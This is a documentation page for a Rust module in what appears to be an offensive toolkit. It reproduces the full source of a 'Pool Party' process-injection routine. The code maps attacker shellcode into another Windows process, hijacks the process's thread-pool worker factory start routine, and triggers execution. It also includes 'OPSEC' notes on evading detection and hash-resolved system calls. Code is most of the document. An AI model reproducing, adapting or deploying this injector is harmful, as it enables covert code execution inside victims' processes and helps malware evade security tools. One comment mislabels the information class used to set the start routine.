# crowd — pool_party.rs  (⚡ GOD TIER)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/pool_party.rs` |
| **Lines** | 339 |
| **Tier** | S |
| **Cards** | T007-process-injection |
| **Role** | Pool Party injection |
| **Unsafe blocks** | 7 |

## Purpose

# crowd — pool_party.rs  (⚡ GOD TIER)

## Pool Party Injection — TpWorkerFactory manipulation

Técnica descrita por SafeBreach Labs (2023). Manipula el `TpWorkerFactory`
del thread pool de Windows para ejecutar shellcode sin crear threads nuevos,
sin APC, y sin SetThreadContext.

### Mecanismo
El thread pool de Win32 tiene un `TpWorkerFactory` que mantiene un worker
thread pre-creado en WAIT state esperando work items. Cuando se le pone
un work item, el thread ejecuta `TppWorkerThread` que a su vez llama
`TppIopExecuteCallback`.

La técnica: reemplazar el `StartRoutine` del `TP_POOL` con un puntero al
shellcode. El siguiente work item que procese el pool ejecutará el shellcode.

### Variant utilizada: #4 — Worker Factory Start Routine
Manipular `TpWorkerFactory.StartRoutine` de forma que el factory thread
llame al shellcode cuando arranca un nuevo worker.

### Estructuras NT utilizadas
- `NtQueryInformationProcess` (ProcessHandleInformation) → enumerar handles
- `NtDuplicateObject` → obtener un handle al TpWorkerFactory del target
- `NtQueryObject` → verificar tipo "TpWorkerFactory"
- `NtSetInformationWorkerFactory` → inyectar el StartRoutine

### OPSEC
- Zero threads nuevos
- Zero APC
- Zero SetThreadContext
- La ejecución ocurre en un thread pre-existente del pool del proceso target

## Constants

- `SECTION_ALL_ACCESS`: `u32` = `0xF001F`
- `WORKER_FACTORY_ALL`: `u32` = `0xF00FF`
- `MEM_COMMIT`: `u32` = `0x1000`
- `MEM_RESERVE`: `u32` = `0x2000`
- `PAGE_EXECUTE_READ`: `u32` = `0x20`
- `PAGE_READWRITE`: `u32` = `0x04`
- `PROCESS_ALL_ACCESS`: `u32` = `0x1FFFFF`
- `SEC_COMMIT`: `u32` = `0x08000000`
- `STATUS_INFO_LENGTH_MISMATCH`: `i32` = `0xC0000004u32 as i32`
- `STATUS_BUFFER_TOO_SMALL`: `i32` = `0xC0000023u32 as i32`

## Types

### struct `SysHandleEntryEx` (line 53)

### struct `SysHandleInfoEx` (line 66)

### struct `ObjTypeInfo` (line 74)

### struct `WorkerFactoryBasicInfo` (line 84)

## Public API

### `pool_party_inject` (line 110)
```rust
pub fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<()>
```
Inject shellcode into `target_pid` via Pool Party (TpWorkerFactory StartRoutine manipulation).

Writes the shellcode via Mapping Injection, then overwrites StartRoutine in the factory.
Returns Ok(()) if injection was queued successfully.

## Internal Functions

- `inner_pool_party` (unsafe) (line 114)
- `map_shellcode_into_target` (unsafe) (line 142)
- `find_worker_factory_handle` (unsafe) (line 198)
- `is_type_worker_factory` (unsafe) (line 277)
- `set_worker_factory_start_routine` (unsafe) (line 304)
- `release_one_worker` (unsafe) (line 327)

## Key Dependencies

- `use anyhow::{anyhow, Result};`
- `use winapi::um::processthreadsapi::OpenProcess;`
- `use winapi::shared::minwindef::FALSE;`

## Full Source

```rust
//! # crowd — pool_party.rs  (⚡ GOD TIER)
//!
//! ## Pool Party Injection — TpWorkerFactory manipulation
//!
//! Técnica descrita por SafeBreach Labs (2023). Manipula el `TpWorkerFactory`
//! del thread pool de Windows para ejecutar shellcode sin crear threads nuevos,
//! sin APC, y sin SetThreadContext.
//!
//! ### Mecanismo
//! El thread pool de Win32 tiene un `TpWorkerFactory` que mantiene un worker
//! thread pre-creado en WAIT state esperando work items. Cuando se le pone
//! un work item, el thread ejecuta `TppWorkerThread` que a su vez llama
//! `TppIopExecuteCallback`.
//!
//! La técnica: reemplazar el `StartRoutine` del `TP_POOL` con un puntero al
//! shellcode. El siguiente work item que procese el pool ejecutará el shellcode.
//!
//! ### Variant utilizada: #4 — Worker Factory Start Routine
//! Manipular `TpWorkerFactory.StartRoutine` de forma que el factory thread
//! llame al shellcode cuando arranca un nuevo worker.
//!
//! ### Estructuras NT utilizadas
//! - `NtQueryInformationProcess` (ProcessHandleInformation) → enumerar handles
//! - `NtDuplicateObject` → obtener un handle al TpWorkerFactory del target
//! - `NtQueryObject` → verificar tipo "TpWorkerFactory"
//! - `NtSetInformationWorkerFactory` → inyectar el StartRoutine
//!
//! ### OPSEC
//! - Zero threads nuevos
//! - Zero APC
//! - Zero SetThreadContext
//! - La ejecución ocurre en un thread pre-existente del pool del proceso target

#![allow(dead_code, non_snake_case)]

use anyhow::{anyhow, Result};
use std::ptr::null_mut;
use std::mem::size_of;

const SECTION_ALL_ACCESS: u32      = 0xF001F;
const WORKER_FACTORY_ALL: u32      = 0xF00FF;
const MEM_COMMIT:         u32      = 0x1000;
const MEM_RESERVE:        u32      = 0x2000;
const PAGE_EXECUTE_READ:  u32      = 0x20;
const PAGE_READWRITE:     u32      = 0x04;
const PROCESS_ALL_ACCESS: u32      = 0x1FFFFF;
const SEC_COMMIT:         u32      = 0x08000000;

// ── NT structures ─────────────────────────────────────────────────────────────

// SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX (class 64 — supports PIDs > 65535)
#[repr(C)]
struct SysHandleEntryEx {
    object:       usize,
    unique_pid:   usize,   // ULONG_PTR — safe for PIDs > 65535
    handle_value: usize,   // ULONG_PTR
    access:       u32,
    creator_bt:   u32,
    object_type:  u32,
    attributes:   u32,
    _reserved:    u32,
}

// SYSTEM_EXTENDED_HANDLE_INFORMATION (class 64)
#[repr(C)]
struct SysHandleInfoEx {
    count:           usize,  // ULONG_PTR
    _reserved:       usize,
    handles:         [SysHandleEntryEx; 1],
}

// OBJECT_TYPE_INFORMATION
#[repr(C)]
struct ObjTypeInfo {
    name_len:   u16,
    name_maxlen:u16,
    _pad:       u32,
    name_buf:   *const u16,
}

// WORKER_FACTORY_BASIC_INFORMATION (class 7: WorkerFactoryBasicInformation)
// Total size on x64: 0x70 (112 bytes)
#[repr(C)]
struct WorkerFactoryBasicInfo {
    timeout:              i64,      // +0x00
    retry_timeout:        i64,      // +0x08
    idle_timeout:         i64,      // +0x18
    paused:               u8,       // +0x20
    _pad_paused:          [u8; 3],  // alignment padding
    turbo_thread:         u8,       // +0x24
    _pad_turbo:           [u8; 3],  // alignment padding
    pool_context:         usize,    // +0x28 (PVOID)
    min_thread_count:     u32,      // +0x30
    max_thread_count:     u32,      // +0x34
    current_workers:      i32,      // +0x38
    _pad2:                u32,      // +0x3C alignment to 8-byte
    start_routine:        usize,    // +0x40 ← target field
    start_parameter:      usize,    // +0x48
    process_id:           usize,    // +0x50
    thread_count:         u32,      // +0x58
    _pad3:                u32,      // +0x5C alignment
    stack_reserve:        usize,    // +0x60
    stack_commit:         usize,    // +0x68
}                                   // total = 0x70 = 112 bytes

/// Inject shellcode into `target_pid` via Pool Party (TpWorkerFactory StartRoutine manipulation).
///
/// Writes the shellcode via Mapping Injection, then overwrites StartRoutine in the factory.
/// Returns Ok(()) if injection was queued successfully.
pub fn pool_party_inject(target_pid: u32, shellcode: &[u8]) -> Result<()> {
    unsafe { inner_pool_party(target_pid, shellcode) }
}

unsafe fn inner_pool_party(target_pid: u32, shellcode: &[u8]) -> Result<()> {
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::shared::minwindef::FALSE;

    let h_proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if h_proc.is_null() {
        return Err(anyhow!("PoolParty: OpenProcess({}) failed", target_pid));
    }
    let h_proc_u = h_proc as usize;

    // ── Step 1: Write shellcode into target via Mapping Injection ─────────────
    let sc_addr = map_shellcode_into_target(h_proc_u, shellcode)?;

    // ── Step 2: Find a TpWorkerFactory handle in the target process ───────────
    let h_factory = find_worker_factory_handle(target_pid, h_proc_u)?;

    // ── Step 3: Overwrite StartRoutine ────────────────────────────────────────
    let res = set_worker_factory_start_routine(h_factory, sc_addr)
        .and_then(|_| release_one_worker(h_factory));

    crate::recycled::nt_close(h_factory);
    winapi::um::handleapi::CloseHandle(h_proc);

    res
}

// ── Map shellcode into target ─────────────────────────────────────────────────

unsafe fn map_shellcode_into_target(h_proc: usize, shellcode: &[u8]) -> Result<usize> {
    let mut max_size: u64 = shellcode.len() as u64;
    let mut h_section: usize = 0;

    let st = crate::recycled::nt_create_section(
        &mut h_section,
        SECTION_ALL_ACCESS,
        null_mut(),
        &mut max_size,
        PAGE_READWRITE,
        SEC_COMMIT,
        0,
    );
    if st != 0 { return Err(anyhow!("PoolParty: NtCreateSection failed: 0x{:x}", st as u32)); }

    // Map local view (write shellcode)
    let mut local: *mut std::ffi::c_void = null_mut();
    let mut local_sz: usize = 0;
    let st = crate::recycled::nt_map_view_of_section(
        h_section,
        (-1isize) as usize, // current process
        &mut local,
        0, 0, null_mut(), &mut local_sz,
        1, 0, PAGE_READWRITE,
    );
    if st != 0 {
        crate::recycled::nt_close(h_section);
        return Err(anyhow!("PoolParty: local NtMapViewOfSection failed: 0x{:x}", st as u32));
    }

    std::ptr::copy_nonoverlapping(shellcode.as_ptr(), local as *mut u8, shellcode.len());
    let unmap_st = crate::recycled::nt_unmap_view_of_section((-1isize) as usize, local);
    if unmap_st != 0 {
        crate::recycled::nt_close(h_section);
        return Err(anyhow!("PoolParty: NtUnmapViewOfSection(local) failed: 0x{:x}", unmap_st as u32));
    }

    // Map remote view (target gets the pages as RX)
    let mut remote: *mut std::ffi::c_void = null_mut();
    let mut remote_sz: usize = 0;
    let st = crate::recycled::nt_map_view_of_section(
        h_section,
        h_proc,
        &mut remote,
        0, 0, null_mut(), &mut remote_sz,
        1, 0, PAGE_EXECUTE_READ,
    );
    crate::recycled::nt_close(h_section);

    if st != 0 { return Err(anyhow!("PoolParty: remote NtMapViewOfSection failed: 0x{:x}", st as u32)); }

    Ok(remote as usize)
}

// ── Find TpWorkerFactory handle ───────────────────────────────────────────────

unsafe fn find_worker_factory_handle(target_pid: u32, h_proc: usize) -> Result<usize> {
    // Enumerate system handles via NtQuerySystemInformation class 64
    // (SystemExtendedHandleInformation — supports PIDs > 65535)
    let mut buf_size: usize = 64 * 1024;
    let hash = crate::resolve::compute_hash("NtQuerySystemInformation");

    const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC0000004u32 as i32;
    const STATUS_BUFFER_TOO_SMALL: i32 = 0xC0000023u32 as i32;

    loop {
        let mut buf: Vec<u8> = vec![0u8; buf_size];
        let mut out_len: u32 = 0;
        let st = crate::recycled::invoke(hash, 4, &[
            64usize, // SystemExtendedHandleInformation (class 64)
            buf.as_mut_ptr() as usize,
            buf_size,
            &mut out_len as *mut u32 as usize,
        ]);
        if st == STATUS_INFO_LENGTH_MISMATCH || st == STATUS_BUFFER_TOO_SMALL {
            buf_size *= 2;
            if buf_size > 128 * 1024 * 1024 { return Err(anyhow!("PoolParty: buffer too large")); }
            continue;
        }
        if st != 0 { return Err(anyhow!("PoolParty: NtQuerySystemInformation(64) failed: 0x{:x}", st as u32)); }

        let info = buf.as_ptr() as *const SysHandleInfoEx;
        let count = (*info).count;
        let handles_base = &(*info).handles[0] as *const SysHandleEntryEx;

        for i in 0..count {
            let entry = &*handles_base.add(i);
            // usize comparison — no truncation, safe for PIDs > 65535
            if entry.unique_pid != target_pid as usize { continue; }

            // Try to duplicate
            let mut h_dup: usize = 0;
            let dup_st = crate::recycled::invoke(
                crate::resolve::compute_hash("NtDuplicateObject"),
                7,
                &[
                    h_proc,
                    entry.handle_value,
                    (-1isize) as usize,
                    &mut h_dup as *mut usize as usize,
                    WORKER_FACTORY_ALL as usize,
                    0usize,
                    0usize,
                ],
            );
            if dup_st != 0 || h_dup == 0 { continue; }

            // Check type name
            if is_type_worker_factory(h_dup) {
                let mut f_info: WorkerFactoryBasicInfo = std::mem::zeroed();
                let mut ret_len = 0u32;
                let q_st = crate::recycled::invoke(
                    crate::resolve::compute_hash("NtQueryInformationWorkerFactory"),
                    5,
                    &[
                        h_dup,
                        7usize, // WorkerFactoryBasicInformation
                        &mut f_info as *mut _ as usize,
                        size_of::<WorkerFactoryBasicInfo>(),
                        &mut ret_len as *mut u32 as usize,
                    ],
                );

                if q_st == 0 && f_info.process_id == target_pid as usize {
                    return Ok(h_dup);
                }
            }
            crate::recycled::nt_close(h_dup);
        }
        break;
    }

    Err(anyhow!("PoolParty: no TpWorkerFactory handle found in PID {}", target_pid))
}

unsafe fn is_type_worker_factory(handle: usize) -> bool {
    let mut buf = vec![0u8; 256];
    let mut ret_len: u32 = 0;
    let st = crate::recycled::invoke(
        crate::resolve::compute_hash("NtQueryObject"),
        5,
        &[
            handle,
            2usize, // ObjectTypeInformation
            buf.as_mut_ptr() as usize,
            buf.len(),
            &mut ret_len as *mut u32 as usize,
        ],
    );
    if st != 0 { return false; }

    let length = *(buf.as_ptr() as *const u16) as usize;
    if length == 0 || buf.len() < 16 + length { return false; }
    let chars_ptr = buf.as_ptr().add(16) as *const u16;
    let name: Vec<u16> = std::slice::from_raw_parts(chars_ptr, length / 2).to_vec();

    let s: String = name.iter().filter_map(|&c| char::from_u32(c as u32)).collect();
    s == "TpWorkerFactory"
}

// ── Overwrite StartRoutine ────────────────────────────────────────────────────

unsafe fn set_worker_factory_start_routine(h_factory: usize, sc_addr: usize) -> Result<()> {
    // NtSetInformationWorkerFactory (class 1: WorkerFactoryThreadMinimum)
    // Struct: { StartRoutine: usize }
    let info = [sc_addr; 1];
    let st = crate::recycled::invoke(
        crate::resolve::compute_hash("NtSetInformationWorkerFactory"),
        4,
        &[
            h_factory,
            1usize, // WorkerFactoryThreadMinimum
            info.as_ptr() as usize,
            size_of::<usize>(),
        ],
    );
    if st != 0 {
        Err(anyhow!("PoolParty: NtSetInformationWorkerFactory failed: 0x{:x}", st as u32))
    } else {
        Ok(())
    }
}

// ── Release one worker to trigger execution ───────────────────────────────────

unsafe fn release_one_worker(h_factory: usize) -> Result<()> {
    // NtReleaseWorkerFactoryWorker — signals the factory to dispatch work
    let st = crate::recycled::invoke(
        crate::resolve::compute_hash("NtReleaseWorkerFactoryWorker"),
        1,
        &[h_factory],
    );
    if st != 0 {
        Err(anyhow!("PoolParty: NtReleaseWorkerFactoryWorker failed: 0x{:x}", st as u32))
    } else {
        Ok(())
    }
}

```